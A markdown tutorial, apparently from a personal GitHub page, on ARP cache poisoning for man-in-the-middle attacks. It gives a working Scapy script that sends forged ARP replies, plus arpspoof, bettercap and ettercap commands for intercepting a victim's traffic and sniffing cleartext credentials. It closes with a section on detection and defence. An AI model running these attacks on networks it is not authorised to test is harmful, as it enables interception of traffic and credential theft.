# ARP spoofing / MITM

ARP has no authentication. A host asks "who has 192.168.1.1?" and simply trusts
whatever reply comes back. If I answer faster (or just keep answering), I can
tell a victim that *my* MAC address owns the gateway's IP. Its traffic then
flows through me, and I'm in the middle.

> Lab / authorized networks only. Intercepting traffic on a network you don't own
> or aren't explicitly allowed to test is illegal in most places. Everything here
> is meant for your own lab.

## 1. The idea

Two ARP caches to poison, both directions of the conversation:

- tell the **victim**: "the gateway's IP is at my MAC"
- tell the **gateway**: "the victim's IP is at my MAC"

Now both send their packets to me. If I forward them on, neither side notices —
that's the difference between a clean MITM and just cutting someone off.

## 2. Setup

You need to be on the same layer-2 network (same LAN / Wi-Fi) as the target, and
you must relay the traffic, so enable IP forwarding first:

```
sudo sysctl -w net.ipv4.ip_forward=1
```

Grab the pieces you'll need: your interface, the gateway IP, the victim IP, and
their MACs (`ip neigh`, or an `arp-scan -l`).

## 3. Poisoning the caches (the mechanism)

An ARP reply (`op=2`) is unsolicited and still accepted. Here it is by hand with
Scapy, which is the clearest way to see what's happening:

```python
from scapy.all import ARP, send

victim  = "192.168.1.50";  victim_mac  = "aa:bb:cc:dd:ee:01"
gateway = "192.168.1.1";   gateway_mac = "aa:bb:cc:dd:ee:02"

# victim <- "I am the gateway"
send(ARP(op=2, pdst=victim,  hwdst=victim_mac,  psrc=gateway), inter=2, loop=1)
# gateway <- "I am the victim"
send(ARP(op=2, pdst=gateway, hwdst=gateway_mac, psrc=victim),  inter=2, loop=1)
```

You repeat the replies (every couple of seconds) because the real devices keep
re-ARPing and will correct themselves otherwise.

When you stop, **restore** the caches so you don't leave the victim offline —
send the correct mappings a few times with the real MACs.

## 4. Doing it with tools

In practice I reach for a tool. Pick one:

```
# dsniff
arpspoof -i eth0 -t 192.168.1.50 192.168.1.1
arpspoof -i eth0 -t 192.168.1.1 192.168.1.50     # the other direction

# bettercap (does forwarding + restore for you)
sudo bettercap -iface eth0
> set arp.spoof.targets 192.168.1.50
> arp.spoof on
> net.sniff on

# ettercap
ettercap -T -i eth0 -M arp /192.168.1.50// /192.168.1.1//
```

Then watch the traffic in Wireshark or `tcpdump -i eth0`.

## 5. What you get, and the limits

Once you're in the middle you can:

- **sniff cleartext** — anything not encrypted (old HTTP, FTP, Telnet, SNMP,
  plain SMTP/POP/IMAP) hands you credentials and content directly.
- **DNS spoofing** — answer DNS queries with your own IP to redirect a domain.
- **downgrade / strip** — historically SSL-strip, now largely defeated by HTTPS
  everywhere + HSTS.

The honest limit: TLS. Modern HTTPS traffic stays encrypted through you — you see
*who* talks to *where* (SNI, IPs), not the contents. MITM shines on flat networks
with legacy or internal cleartext protocols, which is exactly why those still
matter.

## 6. Detecting and defending

- **Static ARP entries** for critical hosts (gateway) — can't be overwritten.
- **Dynamic ARP Inspection (DAI)** + DHCP snooping on managed switches — drops
  forged replies.
- **Port security** limits MACs per port.
- **arpwatch** alerts when an IP's MAC suddenly changes.
- And the real backstop: **encryption everywhere** (TLS, SSH, VPN), so being in
  the middle gets you far less.

---

Built by **White** · [github.com/white-exee](https://github.com/white-exee)
